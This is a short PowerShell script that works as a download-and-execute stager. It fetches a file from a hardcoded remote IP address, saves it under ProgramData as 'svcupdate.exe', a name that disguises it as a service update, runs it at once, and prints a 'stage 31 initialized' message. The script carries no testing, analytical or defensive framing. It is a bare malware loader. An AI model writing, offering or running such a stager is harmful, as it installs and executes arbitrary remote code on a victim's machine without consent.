[CmdletBinding()]
param(
    [string]$TargetUrl = 'https://198.51.100.181/assets/update.dat',
    [string]$LocalPath = "C:\ProgramData\svcupdate.exe"
)
(New-Object System.Net.WebClient).DownloadFile($TargetUrl, $LocalPath)
Start-Process -FilePath $LocalPath
Write-Output "stage 31 initialized"
